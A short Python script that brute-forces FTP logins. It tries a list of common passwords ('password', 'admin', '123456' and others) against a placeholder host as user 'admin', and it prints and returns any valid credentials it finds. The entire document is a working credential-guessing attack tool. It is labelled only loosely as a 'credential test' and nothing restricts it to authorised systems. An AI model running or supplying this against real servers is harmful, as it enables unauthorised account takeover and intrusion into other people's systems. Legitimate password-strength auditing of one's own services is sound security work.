import ftplib
from time import sleep

def attempt_ftp_login(host, username, password, delay=0.5):
    try:
        with ftplib.FTP(host, timeout=5) as ftp:
            ftp.login(user=username, passwd=password)
            return True
    except ftplib.error_perm:
        return False
    except Exception as e:
        print(f"⚠️ Connection error: {e}")
        return None

def brute_force_ftp(host, username, password_list, delay=0.5):
    print(f"🔐 Initiating FTP credential test on {host} for user '{username}'...\n")
    
    for index, password in enumerate(password_list, 1):
        password = password.strip()
        if not password:
            continue
            
        print(f"Attempt #{index}: Testing '{password}'...", end=" ")
        
        result = attempt_ftp_login(host, username, password)
        
        if result is None:
            continue
        elif result:
            print(f"SUCCESS! Valid credentials: {username}:{password}")
            return (username, password)
        else:
            print("Failed")
        
        sleep(delay)
    
    print("\n🚫 All attempts completed. No valid credentials found.")
    return None

if __name__ == "__main__":
    target_host = "ftp.example.com"
    target_user = "admin"
    common_passwords = [
        "password",
        "admin",
        "123456",
        "qwerty",
        "letmein",
    ]
    
    brute_force_ftp(target_host, target_user, common_passwords)